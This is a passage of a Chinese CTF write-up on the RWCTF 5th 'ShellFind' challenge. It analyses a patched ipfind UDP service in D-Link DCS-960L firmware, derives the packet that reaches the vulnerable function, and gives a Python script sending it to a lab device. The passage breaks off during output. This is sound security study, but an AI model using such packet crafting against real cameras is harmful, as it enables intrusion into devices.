---
title: RWCTF 5th ShellFind分析
url: https://buaq.net/go-157925.html
source: unSafe.sh - 不安全
date: 2023-04-11
fetch_date: 2025-10-04T11:29:39.690013
---

# RWCTF 5th ShellFind分析

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/edf0be0c30c8b7a89b31c14c73603d66.jpg)

RWCTF 5th ShellFind分析

题目类型为Pwn，难度描述为 difficulty:Normal，具体描述如下：Hello Hacker.You don't know me, but I kn
*2023-4-10 19:6:0
Author: [xz.aliyun.com(查看原文)](/jump-157925.htm)
阅读量:19
收藏*

---

> 题目类型为Pwn，难度描述为 difficulty:Normal，具体描述如下：
>
> ```
> Hello Hacker.
> You don't know me, but I know you.
> I want to play a game. Here's what happens if you lose.
> The device you are watching is hooked into your Saturday and Sunday.
> When the timer in the back goes off,
> your curiosity will be permanently ripped open.
> Think of it like a reverse bear trap.
> Here, I'll show you.
> There is only one UDP service to shell the device.
> It's in the stomach of your cold firmware.
> Look around Hacker. Know that I'm not lying.
> Better hurry up.
> Shell or out, make your choice.
> ```
>
> 题目文件：<https://github.com/Larryxi/rwctf-5th-shellfind>

## 题目远程环境配置

```
sudo docker run --name shellfind -d --privileged -p 4444/udp --rm 1arry/shellfind
```

## 初步分析

首先把题目给的固件解包，然后发现是D-link DCS 960L，再从官网上下载个最新的固件

最新的固件下载链接：<https://www.dlinktw.com.tw/techsupport/ProductInfo.aspx?m=DCS-960L>

下载之后直接diff比较一下，最大的差距是下面这个

```
Binary files squashfs-root/usr/sbin/ipfind and squashfs-root2/usr/sbin/ipfind differ
```

刚好ipfind是udp服务，符合题目描述，所以对这两个文件进行分析

用bindiff查看一下，发现`401ca4`这个地方被手动patch过了，属于`40172C`函数

![](https://xzfile.aliyuncs.com/media/upload/picture/20230410190310-47fd2436-d78f-1.png)

现在初步分析之后确定ipfind程序为目标程序

## 漏洞分析

先完整分析一下ipfind，首先是下面这个部分

```
ifname = argv[1];
    v4 = ipfind_pid() < 0;
    result = 0;
    if ( !v4 )
    {
      setup_signal_handlers();
      server_sockfd = socket(2, 1, 17);         // udp
      if ( server_sockfd == -1 )
      {
        my_puts("Can't get server socket\n");
        return -1;
      }
      else
```

如果ipfind正常运行

* 注册信号处理函数
* 创建udp套接字

```
v12.sa_family = 2;
        memset(&v12.sa_data[2], 0, 12);
        *v12.sa_data = 62720;
        strncpy(v13, ifname, 0x10u);
        if ( setsockopt(server_sockfd, 0xFFFF, 25, v13, 0x20u) >= 0 )
        {
          if ( setsockopt(server_sockfd, 0xFFFF, 32, &v9, 4u) >= 0 )
          {
            if ( setsockopt(server_sockfd, 0xFFFF, 4, &v10, 4u) >= 0 )
            {
              if ( bind(server_sockfd, &v12, 0x10u) >= 0 )
              {
```

如果套接字创建成功，则绑定到62720端口上

```
struct sockaddr {
unsigned short sa_family; /* address family, AF_xxx */
char sa_data[14]; /* 14 bytes of protocol address */
};
```

sa\_family为2代表是udp，sa\_data=62720则代表要绑定到62720端口上

如果绑定成功就到了最核心的地方

```
sub_4013D0("IPFind start(%s)...\n", ifname);
                v18 = user_data;
                v21 = &user_data[17];
                addr_len = &v11;
                v20 = "FIVI";
                v22 = &v16;
                v23 = &unk_402E90;
                while ( 1 )
                {
                  v5 = &v14;
                  if ( dword_413168 )
                    break;
                  do
                  {
                    *v5 = 0;
                    v5 += 4;
                  }
                  while ( v5 != user_data );
                  v6 = server_sockfd;
                  v14.__fds_bits[server_sockfd >> 5] |= 1 << server_sockfd;
                  if ( select(v6 + 1, &v14, 0, 0, 0) >= 0 )
                  {
                    if ( ((v14.__fds_bits[server_sockfd >> 5] >> server_sockfd) & 1) != 0 )
                    {
                      v11 = 16;
                      memset(user_data, 0, 0x800u);
                      recvfrom(server_sockfd, user_data, 0x800u, 0, &client_addr, addr_len);
                      *&user_data[4] = (*&user_data[4] << 24) | user_data[4] | ((*&user_data[4] & 0xFF0000u) >> 8) | ((*&user_data[4] & 0xFF00) << 8);
                      v7 = ((_byteswap_ushort(*&user_data[9]) << 8) | ((user_data[10] | (user_data[9] << 8)) >> 8));
                      *&user_data[9] = v7;
                      *&user_data[11] = (_byteswap_ushort(*&user_data[11]) << 8) | ((user_data[12] | (user_data[11] << 8)) >> 8);
                      v8 = ((_byteswap_ushort(*&user_data[23]) << 8) | ((user_data[24] | (user_data[23] << 8)) >> 8));
                      *&user_data[23] = v8;
                      v17 = (*&user_data[25] << 24) | user_data[25] | ((*&user_data[25] & 0xFF0000u) >> 8) | ((*&user_data[25] & 0xFF00) << 8);
                      *&user_data[25] = v17;
                      if ( !strncmp(v18, v20, 4u) && user_data[8] == 10 )
                      {
                        if ( v7 == 1 )
                        {
                          if ( !v8 && !memcmp(v21, v23, 6u) && !v17 )
                            sub_40172C(user_data);
                        }
                        else if ( v7 == 2
                               && net_get_hwaddr(ifname, v22) >= 0
                               && !memcmp(v21, v22, 6u)
                               && *&user_data[25] == 142 )
                        {
                          sub_4013F4(user_data, 142);
                        }
                      }
                    }
                  }
```

`recvfrom(server_sockfd, user_data, 0x800u, 0, &client_addr, addr_len);`

* 最大接收0x800个数据到user\_data中

如果满足一些条件，会进入`sub_40172C`函数和`sub_40172C`函数

* `!strncmp(v18, v20, 4u)`
  + v18和v20要相等，v20是`FIVI`，v18是`user_data`起始的数据，所以第一步`user_data = 'FIVI'`
* `user_data[8] == 10`
  + 第9个数要为`'\n'`，所以`user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n'`
* `v7 == 1`

  + `((_byteswap_ushort(*&user_data[9]) << 8) | ((user_data[10] | (user_data[9] << 8)) >> 8)) == 1`
  + 当user\_data[9] = 0x1，user\_data[10] = 0的时候满足这个条件
  + 也就是`user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x01\x00'`
* `!memcmp(v21, v23, 6u)`

  + v21和v23要相等，v23是`0xff * 6`，这里其实就是mac\_addr
  + `user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x01\x00' + \x00\x00\x00\x00\x00\x00 + '\xff' * 6`
* !v8

  + v8要为0，`v8 = ((_byteswap_ushort(*&user_data[23]) << 8) | ((user_data[24] | (user_data[23] << 8)) >> 8))`
  + 23和24都为0的时候v8就为0
  + `user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x01\x00' + \x00\x00\x00\x00\x00\x00 + '\xff' * 6 + '\x00\x00'`
* !v17

  + v17要为0，`v17 = (*&user_data[25] << 24) | user_data[25] | ((*&user_data[25] & 0xFF0000u) >> 8) | ((*&user_data[25] & 0xFF00) << 8)`
  + 当25为0就可以满足条件
  + `user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x01\x00' + \x00\x00\x00\x00\x00\x00 + '\xff' * 6 + '\x00\x00' + '\x00'`

所以进入`sub_40172C`函数的开头是

```
p1 = b'FIVI'
p1 += b'\x00\x00\x00\x00'
p1 += b'\n'
p1 += b'\x01\x00'
p1 += b'\x00\x00\x00\x00\x00\x00'
p1 += b'\xff' * 6
p1 += b'\x00\x00'
p1 += b'\x00'
```

现在写一个连接脚本，并发送p1

```
import socket
from pwn import *

context(os='linux', arch='mips', endian='big', log_level='debug')

li = lambda x : print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + str(x) + '\x1b[0m')
lg = lambda x : print('\033[32m' + str(x) + '\033[0m')

ip = '192.168.10.200'
port = 62720

r = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
lg('[+] open connection')

p1 = b'FIVI'
p1 += b'\x00\x00\x00\x00'
p1 += b'\n'
p1 += b'\x01\x00'
p1 += b'\x00\x00\x00\x00\x00\x00'
p1 += b'\xff' * 6
p1 += b'\x00\x00'
p1 += b'\x00'

r.sendto(p1, (ip, port))

recv_data, recv_addr = r.recvfrom(1024)

li(recv_data)
```

最后可以接收到`sub_40172C`返回的东西

```
[email protected] ~/i/rwctf_2023> python3 exp.py
[+] open connection
b'FIVI\x00\x00\x00\x01\x0b\x01\x00\x00\x00\xc0\xa8\n\xc8\x00\x16>\x00\x00\x01\x00\x00\x00\x02\x00\x00D-Link\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00DC...